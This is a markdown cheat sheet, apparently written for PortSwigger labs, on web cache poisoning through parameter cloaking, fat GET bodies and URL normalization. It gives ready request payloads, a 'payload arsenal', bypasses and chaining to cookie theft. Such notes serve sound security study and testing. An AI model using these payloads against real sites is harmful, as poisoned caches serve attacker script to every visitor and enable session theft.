# Web cache poisoning — Parameter cloaking, fat GET, and URL normalization

Three implementation-level cache quirks let attackers inject payloads that the cache key never sees: (1) **parameter cloaking** — semicolons separate parameters in some frameworks but not in the cache regex, letting extra params hide behind excluded ones; (2) **fat GET** — some servers read query parameters from a GET body, but caches key only the query string; (3) **URL normalization** — caches URL-decode request paths before keying, so a URL-encoded XSS payload in the path is cached under a key that browsers deliver URL-encoded (but the cache serves the decoded, executable version).

## Quick reference
```
# Parameter cloaking (semicolon injection)
# utm_content excluded from cache key by regex, but everything after ; is also excluded
GET /js/geolocate.js?callback=setCountryCookie;callback=alert(1)
→ cache key: /js/geolocate.js?callback=setCountryCookie  (clean)
→ app sees:  callback=alert(1)  (malicious, after semicolon)
→ response:  alert(1)({"country":"UK"})

# Fat GET (body overrides query param)
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback=alert(1)
→ cache key uses query string: callback=setCountryCookie  (clean)
→ app reads body: callback=alert(1)  (malicious)
→ cached response: alert(1)({"country":"UK"})

# URL normalization XSS
GET /random</p><script>alert(1)</script><p>foo HTTP/1.1
→ cache normalizes path (URL-decodes) before keying
→ browser fetches: /random%3C/p%3E%3Cscript%3Ealert(1)%3C/script%3E%3Cp%3Efoo
→ cache serves poisoned response (decoded key matches)
→ XSS fires (browser renders decoded path in error message)
```

## Root cause
- **Cloaking**: Cache computes key by stripping `utm_content` (or similar) with a regex on the query string. The app parses query params by splitting on both `&` and `;`, so `callback=x;utm_content=y;callback=evil` → app sees `callback=evil` after the excluded portion, but cache still keys on `callback=x`.
- **Fat GET**: HTTP spec discourages GET bodies, but frameworks like Express/Flask sometimes read them. The CDN/cache ignores the body (it has no semantic meaning per spec), but the app honours it, and the body param overrides the query param in the response.
- **URL normalization**: The cache normalizes the request path (percent-decodes it) before computing the cache key, but stores and serves the raw response. A browser requesting the percent-encoded URL hits the cache (key matches after decoding), and receives the response containing the non-encoded XSS payload.

## Find it
1. **Cloaking**: Run Param Miner "Rails parameter cloaking scan". Manually test `?callback=x;callback=y` — if response uses `y`, cloaking is possible. Check if `utm_content` is unkeyed first.
2. **Fat GET**: Add `Content-Type: application/x-www-form-urlencoded` and a body `param=value` to a GET that uses that param. If response changes, fat GET is live.
3. **Normalization**: Request a non-existent path containing angle brackets. If they appear unencoded in the error response (server reflects the path), URL normalization may expose XSS. Test with path `/test<script>alert(1)</script>` via Burp Repeater.

## Technique

**Parameter cloaking:**
1. Confirm `utm_content` unkeyed: `?cb=1&utm_content=x` → `X-Cache: hit` on `?cb=1` → yes, unkeyed.
2. Confirm `/js/geolocate.js?callback=setCountryCookie` → response: `setCountryCookie({"country":"UK"})`.
3. Test semicolon: `?callback=setCountryCookie;callback=alert(1)` → response: `alert(1)({"country":"UK"})`.
4. Cache key sees `callback=setCountryCookie` (the original clean value) → poison is cached under the clean key.
5. Victim requests `/js/geolocate.js?callback=setCountryCookie` → gets `alert(1)(...)` → executes.

**Fat GET:**
1. `GET /js/geolocate.js?callback=setCountryCookie` — note clean response.
2. Repeater: add `Content-Type: application/x-www-form-urlencoded` header.
3. Add body: `callback=arbitraryFunction` → response: `arbitraryFunction({"country":"UK"})` → fat GET confirmed.
4. Change body: `callback=alert(1)` → response: `alert(1)({"country":"UK"})`.
5. Replay until `X-Cache: hit`. Victim requests the URL (no body) → cache serves poisoned response.

**URL normalization:**
1. `GET /random` → 404 error reflecting `/random` in the page body.
2. Try: `GET /random</p><script>alert(1)</script><p>foo` in Burp Repeater → payload visible in error response (unencoded).
3. Directly visiting the URL in browser doesn't execute (browser percent-encodes the path on the wire).
4. Use Burp Repeater to send the raw unencoded path → cache stores the response, keyed on the decoded path.
5. Now deliver URL to victim: `https://LAB/random%3C%2Fp%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cp%3Efoo`. Browser sends percent-encoded request → cache normalizes path → cache key matches poisoned entry → serves XSS response → browser renders → alert fires.

## Payload arsenal
```
# Parameter cloaking
GET /js/geolocate.js?callback=setCountryCookie;callback=alert(1)

# Fat GET
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded

callback=alert(1)

# URL normalization — Repeater payload (raw, unencoded)
GET /random</p><script>alert(1)</script><p>foo HTTP/1.1

# URL normalization — victim delivery link (browser percent-encoded)
https://LAB/random%3C%2Fp%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3Cp%3Efoo

# Generic fat GET test
GET /api/endpoint?param=original HTTP/1.1
Content-Type: application/x-www-form-urlencoded

param=injected
```

## Bypasses
| Defense | Bypass |
|---|---|
| utm_content excluded but semicolon not tested | Test all delimiter variants: `;`, `%3B`, `&utm_content=x;callback=evil` |
| Cache ignores body by design | Fat GET only works if the app framework reads body on GET (Express, some Rails configs) |
| URL normalization varies by CDN | Test Varnish (normalizes), Cloudflare (may not) — behavior is CDN-specific |
| Regex strips utm_content but not sub-params | Double-nesting: `?x=y&utm_content=a;x=evil` |

## Exploitation walkthrough
**Parameter cloaking:**
`?callback=setCountryCookie;callback=alert(1)` → response `alert(1)(...)` → cache hit on clean URL → victim's browser executes `alert(1)` when the page loads geolocate.js.

**Fat GET:**
Repeater: GET with body `callback=alert(1)` → response `alert(1)(...)` → cache hit → victim requests URL (no body) → gets `alert(1)(...)` from cache → fires.

**URL normalization:**
Burp Repeater: send unencoded path → cache stores under decoded key → deliver percent-encoded URL to victim → browser decode-matches cache → XSS fires in error page.

## Chaining
- Cloaked geolocate.js → arbitrary JS execution on every page load → [XSS/Exploiting-XSS](../../XSS/Exploiting-XSS/)
- URL normalization XSS → steal admin cookies → [Access-control](../../Access-control/)
- Fat GET discovery → test same technique on API endpoints → combine with [API-testing](../../API-testing/)

## Tools
- **Param Miner** (BApp) — "Rails parameter cloaking scan", "Guess GET parameters"
- **Burp Repeater** — send raw unencoded paths and fat GET bodies
- **Hackvertor** (BApp) — encode/decode URL segments for delivery URLs

## Labs

### Parameter cloaking [Practitioner]
`utm_content` unkeyed. Semicolon injection: `?callback=setCountryCookie;callback=alert(1)` → response uses `alert(1)`. Cache key is clean. Victim gets `alert(1)(...)` from geolocate.js on every page. Key insight: semicolons are param delimiters in some frameworks but not in cache key regex → extra params hide behind excluded ones.

### Web cache poisoning via a fat GET request [Practitioner]
GET /js/geolocate.js body: `callback=alert(1)` → overrides query `callback=setCountryCookie`. Cache keyed on query only. Poison fires for victim requesting URL (no body). Key insight: CDNs are agnostic to GET bodies; apps that read them expose a persistent poisoning vector with clean cache keys.

### URL normalization [Practitioner]
`GET /random</p><script>alert(1)</script><p>foo` (raw in Repeater) → error page reflects unencoded path. Cache stores under decoded key. Victim clicks percent-encoded URL → cache serves poisoned error → XSS fires. Key insight: difference between cache normalization and browser encoding creates a window where only Burp (sending raw bytes) can poison the cache, but browsers still hit the poisoned entry.

## Real-world notes
- Parameter cloaking is common in Ruby on Rails apps (both `;` and `&` delimit params natively).
- Fat GET bodies are accepted by Express.js by default with `body-parser` mounted globally — extremely common in Node.js APIs.
- URL normalization behaviour varies widely: Varnish normalizes aggressively; Cloudflare generally does not. Always test empirically.
- Combine cloaking with unkeyed param discovery: if utm_content is excluded AND semicolons work, you can cloak any second parameter you want.

## References
- https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
